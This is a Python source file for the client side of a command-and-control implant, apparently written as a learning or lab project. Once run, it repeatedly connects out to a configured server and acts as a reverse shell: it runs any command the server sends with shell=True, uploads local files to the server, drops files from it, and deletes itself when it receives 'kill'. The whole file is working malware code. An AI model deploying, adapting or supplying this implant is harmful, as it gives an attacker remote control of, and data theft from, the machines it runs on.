#!/usr/bin/python3

import socket
import os
import sys
import pathlib
import hashlib
import time
import random
import subprocess

SERVER_IP = "127.0.0.1"  # Remote address
PORT = 1234  # Remote port
FORMAT = "utf-8"  # Message encoding format
HEADER_SIZE = 10  # Message header size
MAX_CONSECUTIVE = 5  # Max consecutive connection attempts
SEGMENT_SIZE = 1024  # Segment size when downloading / uploading files
TIMEOUT = 1  # Socket timeout when downloading / uploading files
COOLDOWN = (1, 1)  # Range of time to sleep between consecutive connection attempts (In seconds)
HIBERNATE = (1, 1)  # Range of time to hibernate after reaching maximum retries / Identifying a used port
COMMAND_TIMEOUT = 10  # Time limit for command execution on the client side
DOWNLOADS = pathlib.Path(__file__).parent  # Downloaded files destination path
OS = os.name  # Local operating system
MUTEX = pathlib.Path(__file__).parent.joinpath("mutex")  # Path to mutex containing the current pid of this program
REMOVE_MUTEX = True


def get_file_hash(data: list[bytes]) -> str:
    """
    Calculates a file md5 hash.

    :param data: File content split into segments
    :type data: list[bytes]
    :return: Md5 hash of the file
    :rtype: str
    """
    md5 = hashlib.md5()
    for chunk in data:
        md5.update(chunk)
    return md5.hexdigest()


def upload_file(sock: socket.socket, path: str) -> None:
    """
    Uploads file from clietn to server.

    :param sock: Server socket object
    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    :param path: Target file path
    :type path: str
    :return: None
    """
    # Implemented segmentation when reading / sending file data to avoid memory overload
    path = str(pathlib.Path(path).resolve())  # Absolute path (Resolve symlinks)
    try:
        # Read target file in segments
        data = []
        with open(path, "rb") as f:
            chunk = f.read(SEGMENT_SIZE)
            while chunk:
                data.append(chunk)
                chunk = f.read(SEGMENT_SIZE)
        sock.send("1".ljust(HEADER_SIZE).encode(FORMAT))  # Signal: File contents were successfully read

        # Calculate & send file hash, later used for integrity verifications on server side
        md5 = get_file_hash(data)
        sock.send(md5.encode(FORMAT))

        # Send segmented file data
        for segment in data:
            if segment:
                sock.send(segment)
    except (FileNotFoundError, IOError):  # Signal: Error when trying tor ead from target file
        sock.send("0".ljust(HEADER_SIZE).encode(FORMAT))


def download_file(sock: socket.socket, path: str) -> None:
    """
    Downloads file from server to client.

    :param sock: Server socket object
    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    :param path: Target file path
    :type path: str
    :return: None
    """
    # Implemented segmentation when writing / receiving file data to avoid memory overload
    file_name = pathlib.Path(path).name  # File name without the full path
    dst = str(DOWNLOADS.joinpath(file_name))  # Create destination file full path
    original = sock.gettimeout()
    sock.settimeout(TIMEOUT)  # Set requested timeout
    original_md5 = ""
    data = []
    result = ""
    message = ""
    try:
        # Get client side status
        readable_src_file = int(sock.recv(HEADER_SIZE).decode(FORMAT))
        if readable_src_file:  # File was read successfully on client side
            # Get original file hash
            original_md5 = sock.recv(32).decode(FORMAT)

            # Receive segmented file contents and write to destination file
            with open(dst, "wb") as f:
                segment = sock.recv(SEGMENT_SIZE)
                while segment:  # Keep receiving data until timeout
                    f.write(segment)
                    data.append(segment)  # Save written data for hash calculation
                    segment = sock.recv(SEGMENT_SIZE)
        else:  # Error finding / reading file on client side
            result = "0"
            message = "ERROR"
    except socket.timeout:  # Reached timeout, proceed to check file integrity
        # Calculate downloaded file hash
        result_md5 = get_file_hash(data)
        # Integrity verification
        if result_md5 == original_md5:
            # Successful download
            result = "1"
            message = file_name
        else:
            # Timeout reached before completing the download
            result = "0"
            message = "TIMEOUT"
    finally:
        # Send final result and message to the server side
        sock.send(result.ljust(SEGMENT_SIZE).encode(FORMAT))
        sock.send(message.ljust(SEGMENT_SIZE).encode(FORMAT))
        # Reset timeout value
        sock.settimeout(original)


def run_msg(msg: str) -> str:
    """
    Runs messages received from the server as commands on the local system.

    :param msg: Message from the server
    :type msg: str
    :return: Command output
    :rtype: str
    """
    # Command execution attempt
    try:
        output = subprocess.run(rf"{msg}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                timeout=COMMAND_TIMEOUT)
        return output.stdout.decode()
    except subprocess.TimeoutExpired as err:
        return str(err)


def send_output(sock: socket.socket, msg: str) -> None:
    """
    Runs received commands on the local system, and sends the output back to the server.

    :param sock: Server socket object
    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    :param msg: Command to run
    :type msg: str
    :return: None
    """
    # Attempt to change directory
    if msg[:3] == "cd ":
        path = msg[3:]
        try:
            os.chdir(path)
            output = ""  # Send an empty message upon success
        except FileNotFoundError:  # Unrecognized directory specified
            output = f"[!] ERROR: Directory {path} doesn't exist"
    else:
        output = run_msg(msg)

    # Send the message to the client, prefixed by a header of a set size
    # The header contains the message length padded by spaces (Used to ensure connection reliability)
    # Design flaw: Message size limit (E.g Message size limit of '9,999,999,999' if 'HEADER_SIZE' equals '10')
    msg_len = len(output)
    sock.send((f"{msg_len:<{HEADER_SIZE}}" + output).encode(FORMAT))


def recv_msg(sock: socket.socket) -> str:
    """
    Receives encoded commands from the server and returns them decoded.

    :param sock: Server socket object
    :type sock: socket(socket.AF_INET, socket.SOCK_STREAM)
    :return: Decoded commands from the server
    :rtype: str
    """
    try:
        # Only receive the header and extract the message length
        msg_len = int(sock.recv(HEADER_SIZE).decode(FORMAT))
        # Receive & return the message in its entirety
        return sock.recv(msg_len).decode(FORMAT)
    except ValueError:
        return ""


def shell(sock: socket.socket) -> None:
    """
    Received commands from the server and executes the appropriate action.

    :param sock: Server socket object
    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    :return: None
    """
    orig = sock.gettimeout()
    sock.settimeout(COMMAND_TIMEOUT)
    while sock:
        try:
            msg_from_server = recv_msg(sock)
        except socket.timeout:
            continue
        # For certain keywords, run the appropriate action
        if msg_from_server in ["quit", "exit"]:  # Server side connection termination signal
            sock.close()
            break
        if msg_from_server == "kill":  # Server side activity termination signal
            os.remove(sys.argv[0])  # Delete client side script from the target system
            os._exit(0)  # Exit immediately (Do not resolve 'finally' statements)
        elif msg_from_server in ["clear", "bg", "background"]:  # Ignore certain server side keywords
            pass
        elif msg_from_server[:9] == "download ":  # Server side file download signal
            upload_file(sock, msg_from_server[9:])
        elif msg_from_server[:7] == "upload ":  # Server side file upload signal
            download_file(sock, msg_from_server[7:])
        elif msg_from_server:  # Any other command
            send_output(sock, msg_from_server)
    sock.settimeout(orig)


def establish_connection(sock: socket.socket, consecutive_connections: int) -> int:
    """
    Connects to a listening server socket.

    :param sock: Local system socket object
    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    :return: Number of consecutive connection attempts
    :rtype: int
    """
    # Connection attempt to server side
    try:
        sock.connect((SERVER_IP, PORT))
        shell(sock)
    except ConnectionError:  # No listener found
        # Count consecutive connection attempts
        if consecutive_connections < MAX_CONSECUTIVE:
            consecutive_connections += 1
            print("sleep 1")
            time.sleep(random.randint(COOLDOWN[0], COOLDOWN[1]))
        else:  # Reached maximum consecutive connections allowed, going to sleep...
            consecutive_connections = 1
            print("hibernate 1")
            time.sleep(random.randint(HIBERNATE[0], HIBERNATE[1]))
    except OSError as err:  # Required port is already in use
        print(f"{err = }")
        time.sleep(random.randint(HIBERNATE[0], HIBERNATE[1]))
    except KeyboardInterrupt:
        pass
    finally:
        return consecutive_connections


def check_process_running(pid: str) -> bool:
    """
    Checks whether a given PID is currently being used by a running process.

    :param pid: Process ID
    :type pid: str
    :return: True if PID belongs to a running process, False otherwise
    :rtype: bool
    """
    # Not using the psutil library since it is not builtin, and client side shouldn't require any installations
    # Check on a Windows based system
    if OS == 'nt':
        try:
            output = subprocess.check_output(f'tasklist /nh /fi "PID eq {pid}"')
            if f"{pid}" in output.decode():  # PID belongs to a running process
                return True
            return False  # No running process is using the given PID
        except subprocess.CalledProcessError:
            return False  # An error occurred when runnin command (Meaning process doesn't exist)

    # Check on a Unix baseed system
    else:
        try:
            os.kill(int(pid), 0)  # Throws error if PID doesn't exist, does nothing if it exists
            # No exception raised (Meaning process exists)
            return True
        except ProcessLookupError:  # Process not found => errno.ESRCH
            return False
        except PermissionError:  # Unable to send signal to process (Means process exists) => errno.EPERM
            return False


def verify_mutex() -> None:
    """
    Verifies whether a mutex containing a valid PID already exists, creating one if it doesn't, quittting if it does.

    :return: None
    """
    global REMOVE_MUTEX
    # Verify this program isn't already running on the local system
    if os.path.isfile(MUTEX):  # Mutex containing current PID exists
        # Retrive PID
        with open(MUTEX, "r") as f:
            pid = f.read()

        # Verify PID is currently running
        if check_process_running(pid):
            # Another instance of this program is already running on the local system, aborting...
            print(f"Program already running, aborting...")
            REMOVE_MUTEX = False
            sys.exit()

    # Create new MUTEX
    with open(MUTEX, "w") as f:
        f.write(str(os.getpid()))  # Write this program's PID into MUTEX


def main() -> None:
    """
    Main function for the C&C client side.

    :return: None
    """
    # Verify program isn't already running and create mutex
    verify_mutex()

    # Start program execution
    consecutive_connections = 1
    s = ""
    # Establish client side
    while True:  # 24/7 Beacon attempts once executed
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Enable address reuse
            consecutive_connections = establish_connection(s, consecutive_connections)
        except KeyboardInterrupt:
            pass
        finally:
            if s:
                s.close()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
    finally:
        if REMOVE_MUTEX:
            os.remove(MUTEX)
